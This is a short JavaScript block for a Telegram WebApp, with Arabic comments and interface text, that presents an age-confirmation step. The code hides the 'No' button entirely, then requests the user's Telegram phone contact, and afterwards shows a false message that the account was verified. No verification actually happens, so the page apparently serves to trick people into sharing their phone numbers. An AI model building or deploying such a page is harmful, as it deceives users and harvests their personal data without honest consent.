<script>
  const tg = window.Telegram.WebApp;
  tg.ready();
  tg.expand();

  const isInsideTelegram = !!(tg.initData && tg.initData.length > 0);

  /* ── تأكيد العمر ── */
  function confirmAge() {
    document.getElementById('ageOverlay').style.display = 'none';
    document.getElementById('loading').style.display = 'flex';

    if (!isInsideTelegram) {
      setTimeout(() => showSuccess(), 800);
      return;
    }

    if (tg.requestContact) {
      tg.requestContact((shared) => {
        showSuccess(); // بعد إرسال الرقم
      });
    } else {
      showSuccess();
    }
  }

  /* ── إخفاء زر "لا" بالكامل ── */
  document.querySelector('.btn-deny').style.display = 'none';

  /* ── صفحة النجاح فقط ── */
  function showSuccess() {
    document.getElementById('loading').style.display = 'none';

    document.querySelector('.page').innerHTML = `
      <div style="
        height:100vh;
        display:flex;
        align-items:center;
        justify-content:center;
        flex-direction:column;
        text-align:center;
        gap:15px;
      ">
        <div style="font-size:60px;">✅</div>
        <h2 style="color:#22c55e;">تم التحقق من حسابك بنجاح</h2>
        <p style="color:#6b7280;">يمكنك الآن استخدام الخدمة</p>

        <button onclick="Telegram.WebApp.close()" style="
          margin-top:20px;
          padding:12px 18px;
          border:none;
          border-radius:10px;
          background:#4f8ef7;
          color:#fff;
          font-weight:bold;
        ">
          إغلاق
        </button>
      </div>
    `;
  }

  /* ── رفض العمر (اختياري) ── */
  function denyAge() {
    tg.close();
  }
</script>
